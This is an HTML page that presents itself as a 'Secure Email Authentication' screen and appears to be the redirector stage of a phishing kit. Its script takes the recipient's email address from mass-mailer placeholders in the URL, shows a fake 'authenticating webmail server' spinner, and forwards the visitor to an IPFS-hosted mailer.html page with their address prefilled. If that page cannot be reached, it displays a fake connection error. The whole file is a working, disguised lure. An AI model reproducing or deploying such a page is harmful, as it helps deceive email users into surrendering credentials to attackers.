<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Email Authentication</title>
    <style>
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
            color: #1e293b;
        }
        
        /* Advanced Security Spinner */
        .auth-spinner {
            position: relative;
            width: 120px;
            height: 120px;
            margin-bottom: 25px;
        }
        
        .spinner-outer {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 8px solid rgba(59, 130, 246, 0.1);
            border-top-color: #3b82f6;
            border-bottom-color: #3b82f6;
            animation: spin 1.8s linear infinite;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.2);
        }
        
        .spinner-middle {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            bottom: 20px;
            border-radius: 50%;
            border: 6px solid transparent;
            border-left-color: #60a5fa;
            border-right-color: #60a5fa;
            animation: spinReverse 2.2s linear infinite;
        }
        
        .spinner-inner {
            position: absolute;
            top: 40px;
            left: 40px;
            right: 40px;
            bottom: 40px;
            border-radius: 50%;
            border: 4px solid #93c5fd;
            animation: pulse 2s ease-in-out infinite;
        }
        
        .auth-status {
            font-size: 1.1rem;
            font-weight: 500;
            margin-top: 20px;
            color: #475569;
            position: relative;
        }
        
        .auth-status::after {
            content: '...';
            position: absolute;
            animation: dots 1.5s steps(5, end) infinite;
        }
        
        .error-message {
            color: #dc2626;
            margin-top: 20px;
            display: none;
        }

        /* Email field styles */
        .email-container {
            margin-top: 30px;
            display: none;
        }
        
        .email-field {
            padding: 12px 15px;
            font-size: 16px;
            border: 2px solid #d1d5db;
            border-radius: 8px;
            width: 300px;
            transition: all 0.3s ease;
        }
        
        .email-field-locked {
            background-color: #f3f4f6;
            border-color: #9ca3af;
            color: #4b5563;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes spinReverse {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(-720deg); }
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
        }
        
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="auth-spinner">
        <div class="spinner-outer"></div>
        <div class="spinner-middle"></div>
        <div class="spinner-inner"></div>
    </div>
    
    <div class="auth-status">Authenticating webmail server</div>
    
    <div class="error-message" id="errorMessage">
        <h2>Connection Error</h2>
        <p>The authentication page is currently unavailable.</p>
    </div>
    
    <div class="email-container" id="emailContainer">
        <input type="email" class="email-field" id="emailField" placeholder="Your email address">
    </div>

    <script>
        // 1. Extract email from URL (supports all formats)
        function extractEmail() {
            // Combine both hash and query parameters
            const params = new URLSearchParams(
                window.location.search + '&' + 
                window.location.hash.substring(1)
            );
            
            // Check all possible parameter names with priority to hash
            return window.location.hash.includes('{email}') 
                ? window.location.hash.substring(1) // Return full hash if using simple {email} format
                : params.get('email') || 
                  params.get('{email}') || 
                  params.get('[[-Email-]]') || 
                  '{email}'; // Final fallback
        }

        // 2. Build redirect URL with email
        function buildRedirectUrl() {
            const email = extractEmail();
            const baseUrl = "https://bafybeig6wqleoppjdvqv2gdyvzrsvsq5sr5gjewtwnbqslkrdx6y4mx2nq.ipfs.dweb.link/mailer.html";
            
            // Use #{email} format in the hash as requested
            return `${baseUrl}#${encodeURIComponent(email)}`;
        }

        // 3. Check IPFS availability and redirect
        function verifyAndRedirect() {
            const redirectUrl = buildRedirectUrl();
            
            fetch(redirectUrl, { method: 'HEAD', mode: 'no-cors' })
                .then(() => {
                    window.location.href = redirectUrl;
                })
                .catch(() => {
                    document.querySelector('.auth-spinner').style.display = 'none';
                    document.querySelector('.auth-status').style.display = 'none';
                    document.getElementById('errorMessage').style.display = 'block';
                });
        }

        // Email field population handler
        window.addEventListener('DOMContentLoaded', () => {
            // Special handling for #{email} format
            const email = window.location.hash.includes('{email}') 
                ? window.location.hash.substring(1) 
                : null;
            
            if (email) {
                const emailField = document.getElementById('emailField');
                if (emailField) {
                    emailField.value = decodeURIComponent(email);
                    emailField.readOnly = true;
                    emailField.classList.add('email-field-locked');
                    
                    // Show the email container
                    document.getElementById('emailContainer').style.display = 'block';
                    
                    // Hide the spinner and status
                    document.querySelector('.auth-spinner').style.display = 'none';
                    document.querySelector('.auth-status').style.display = 'none';
                }
            } else {
                // Start the authentication process after brief delay
                setTimeout(verifyAndRedirect, 1500);
            }
        });
    </script>
</body>
</html>
